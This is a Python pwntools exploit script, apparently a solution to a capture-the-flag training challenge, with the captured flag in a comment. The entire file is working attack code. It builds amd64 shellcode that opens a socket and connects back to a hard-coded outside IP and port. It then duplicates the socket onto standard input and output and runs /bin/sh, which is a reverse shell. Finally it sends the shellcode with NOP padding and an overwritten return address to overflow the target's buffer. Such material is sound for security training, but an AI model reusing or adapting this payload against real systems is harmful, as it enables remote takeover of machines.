# flag{congratz_you_exploited_a_server!}
# ncat bin.training.jinblack.it 2005

import sys
from pwn import *
from pwn import p8, p16, p32, p64

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2005)
else:
    p = remote("localhost", 2005)
    # p = process("./shellcode")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x0000000000400524
    """)

shellcode_socket = asm("""
mov rax, 0x29
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall
mov rbx, rax
""", arch='amd64')

# ip + hton(port) + 2 (IF_NET type of socket)
# 8 + 4 + 4
# ip is saved byte per byte
sock_addr = 0xd10d9c1250480002

shellcode_connect = asm("""
mov rsi, %s
push rsi
mov rsi, rsp

mov rax, 0x2a
mov rdi, rbx
mov rdx, 0x10
syscall
""" % sock_addr, arch='amd64')

shellcode_dup2 = asm("""
mov rax, 0x21
mov rdi, rbx
mov rsi, 0
syscall

mov rax, 0x21
mov rdi, rbx
mov rsi, 1
syscall

mov rax, 0x21
mov rdi, rbx
mov rsi, 2
syscall
""", arch='amd64')

shellcode_execve = asm("""
mov rdi, 0x68732f6e69622f
push rdi    
mov rdi, rsp          

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

shellcode_exit = asm("""
mov rax, 0x3c
mov rdi, 13
syscall
""", arch='amd64')

payload = b""
payload += shellcode_socket
payload += shellcode_connect
payload += shellcode_dup2
payload += shellcode_execve
payload += shellcode_exit
payload = payload.ljust(1008 + 8, b"\x90")
payload += p64(0x4040c0)

p.sendline(payload)
p.interactive()
